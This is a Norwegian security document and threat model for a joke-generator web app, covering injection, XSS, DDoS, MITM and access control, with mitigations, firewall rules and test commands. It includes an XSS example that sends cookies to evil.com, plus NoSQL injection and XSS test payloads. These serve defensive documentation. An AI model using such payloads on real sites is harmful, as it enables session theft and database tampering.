# Sikkerhetsdokumentasjon - Vits-Generator

## Oversikt

Dette dokumentet beskriver potensielle sikkerhetstrusler mot Vits-Generator systemet og tiltak for å redusere risiko for sikkerhetsbrudd.

## Identifiserte Angrepstyper

### 1. SQL Injection / NoSQL Injection

**Beskrivelse**: Angriper forsøker å injisere ondsinnet kode i database-spørringer for å få uautorisert tilgang til data eller manipulere databasen.

**Sannsynlighet**: Middels  
**Konsekvens**: Høy  
**Risiko**: Høy

**Eksempel på angrep**:
```javascript
// Ondsinnet input i vurdering
{
  "rating": {"$gt": 0},
  "$set": {"averageRating": 5}
}
```

**Tiltak**:
1. ✅ Mongoose bruker parameteriserte spørringer som standard
2. ✅ Input-validering på alle API-endepunkter
3. ✅ Type-sjekking og sanitering av brukerinput
4. ✅ Begrensede database-rettigheter

**Implementasjon**:
```javascript
// Backend validering
if (!rating || typeof rating !== 'number' || rating < 1 || rating > 5) {
  return res.status(400).json({ error: 'Ugyldig vurdering' });
}
```

### 2. Cross-Site Scripting (XSS)

**Beskrivelse**: Angriper injiserer ondsinnet JavaScript-kode som kjøres i andre brukeres nettlesere.

**Sannsynlighet**: Høy  
**Konsekvens**: Middels  
**Risiko**: Høy

**Eksempel på angrep**:
```html
<!-- I en vits -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

**Tiltak**:
1. ✅ EJS escaper HTML-output automatisk
2. ✅ Content Security Policy (CSP) headers via Helmet.js
3. ✅ Input-validering og sanitering
4. ✅ HttpOnly cookies (hvis brukt)

**Implementasjon**:
```javascript
// Helmet.js konfigurasjon
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "cdnjs.cloudflare.com"],
      styleSrc: ["'self'", "'unsafe-inline'", "cdnjs.cloudflare.com"],
      imgSrc: ["'self'", "data:"],
    },
  },
}));
```

### 3. Distributed Denial of Service (DDoS)

**Beskrivelse**: Angriper overvelder systemet med trafikk for å gjøre tjenesten utilgjengelig.

**Sannsynlighet**: Middels  
**Konsekvens**: Middels  
**Risiko**: Middels

**Tiltak**:
1. ✅ Rate limiting implementert (100 requests per 15 min)
2. ✅ Cloudflare eller lignende DDoS-beskyttelse (anbefalt)
3. ✅ Ressursbegrensninger på server-nivå
4. ✅ Timeout på API-kall

**Implementasjon**:
```javascript
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'For mange forespørsler, prøv igjen senere'
});
```

### 4. Man-in-the-Middle (MITM)

**Beskrivelse**: Angriper avlytter eller modifiserer kommunikasjon mellom klient og server.

**Sannsynlighet**: Lav (med HTTPS)  
**Konsekvens**: Høy  
**Risiko**: Middels

**Tiltak**:
1. 🔄 Implementer HTTPS/TLS på alle tjenester
2. ✅ HTTP Strict Transport Security (HSTS) via Helmet
3. 🔄 SSL-sertifikater fra pålitelig CA
4. ✅ Sikre cookies med Secure-flagg

### 5. Broken Access Control

**Beskrivelse**: Angriper får tilgang til ressurser de ikke skal ha tilgang til.

**Sannsynlighet**: Lav  
**Konsekvens**: Høy  
**Risiko**: Middels

**Tiltak**:
1. ✅ MongoDB kun tilgjengelig fra Backend IP
2. ✅ Backend API kun tilgjengelig fra Frontend IP
3. ✅ Ingen autentisering nødvendig (by design)
4. ✅ Prinsipp om minste privilegium

## Generelle Sikkerhetstiltak

### 1. Nettverkssikkerhet

**Brannmurregler (iptables eksempel)**:
```bash
# Frontend (10.12.91.55)
iptables -A INPUT -p tcp --dport 3000 -j ACCEPT
iptables -A INPUT -s 10.12.91.44 -j ACCEPT
iptables -A INPUT -j DROP

# Backend (10.12.91.44)
iptables -A INPUT -s 10.12.91.55 -p tcp --dport 3001 -j ACCEPT
iptables -A INPUT -s 10.12.91.66 -j ACCEPT
iptables -A INPUT -j DROP

# MongoDB (10.12.91.66)
iptables -A INPUT -s 10.12.91.44 -p tcp --dport 27017 -j ACCEPT
iptables -A INPUT -j DROP
```

### 2. Applikasjonssikkerhet

**Sikkerhetshoder implementert**:
```
X-DNS-Prefetch-Control: off
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
```

**Cookie-sikkerhet**:
```javascript
// Cookie-innstillinger
{
  httpOnly: true,           // Forhindrer JavaScript-tilgang
  secure: true,             // Kun over HTTPS i produksjon
  sameSite: 'strict',       // Beskytter mot CSRF
  maxAge: 365 * 24 * 60 * 60 * 1000  // 1 år
}
```

### 3. Database-sikkerhet

**MongoDB konfigurasjon**:
```yaml
# /etc/mongod.conf
net:
  bindIp: 10.12.91.66
  port: 27017

security:
  authorization: enabled

setParameter:
  enableLocalhostAuthBypass: false
```

### 4. Logging og Overvåking

**Implementer logging for**:
- Alle API-requests
- Feilede vurderingsforsøk
- Database-tilkoblingsfeil
- Rate limit overtredelser

**Eksempel logging**:
```javascript
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path} - ${req.ip}`);
  next();
});
```

### 5. Oppdateringer og Patching

**Rutiner**:
1. Ukentlig sjekk av npm audit
2. Månedlig oppdatering av dependencies
3. Kvartalsvis OS-patching
4. Årlig sikkerhetsgjennomgang

**Automatisering**:
```json
// package.json
"scripts": {
  "security-check": "npm audit && npm outdated",
  "update-deps": "npm update && npm audit fix"
}
```

## Incident Response Plan

### Ved sikkerhetsbrudd:

1. **Deteksjon**: Overvåk logger for uvanlig aktivitet
2. **Isolering**: Blokker angripers IP umiddelbart
3. **Analyse**: Undersøk omfang og type angrep
4. **Reparasjon**: Patch sårbarheter og gjenopprett data
5. **Dokumentasjon**: Logg hendelsen og tiltak
6. **Forbedring**: Oppdater sikkerhetstiltak

## Sikkerhetstesting

### Anbefalte verktøy:

1. **OWASP ZAP**: For automatisert sikkerhetsskanning
2. **npm audit**: For å sjekke kjente sårbarheter
3. **MongoDB Compass**: For database-sikkerhet
4. **Postman**: For API-testing med ondsinnede payloads

### Testscenarioer:

```bash
# Test XSS
curl -X POST http://backend/api/joke/123/rate \
  -H "Content-Type: application/json" \
  -d '{"rating": "<script>alert(1)</script>"}'

# Test injection
curl -X POST http://backend/api/joke/123/rate \
  -H "Content-Type: application/json" \
  -d '{"rating": {"$gt": 0}}'

# Test rate limiting
for i in {1..150}; do
  curl http://backend/api/joke/random
done
```

## Compliance og Beste Praksis

### GDPR/Personvern:
- ✅ Ingen persondata lagres
- ✅ Kun én cookie for bruker-ID (anonym UUID)
- ✅ Cookie inneholder ingen personlig informasjon
- ✅ Anonym vurdering
- ✅ Ingen brukerregistrering
- ✅ Brukere kan slette sin historikk ved å slette cookies

### OWASP Top 10 (2021):
1. ✅ Broken Access Control - Adressert
2. ✅ Cryptographic Failures - HTTPS påkrevd
3. ✅ Injection - Validering implementert
4. ✅ Insecure Design - Sikkerhet by design
5. ✅ Security Misconfiguration - Hardening gjort
6. ✅ Vulnerable Components - npm audit
7. ✅ Authentication Failures - N/A (ingen auth)
8. ✅ Software and Data Integrity - Validering
9. ✅ Logging Failures - Logging implementert
10. ✅ SSRF - Ikke relevant

## Kontaktinformasjon

Ved sikkerhetshendelser, kontakt:
- Systemadministrator: [FYLL INN]
- Sikkerhetsansvarlig: [FYLL INN]
- Nødepost: security@[domene].no

## Versjon og Oppdateringer

- Versjon: 1.0
- Sist oppdatert: Januar 2024
- Neste gjennomgang: April 2024 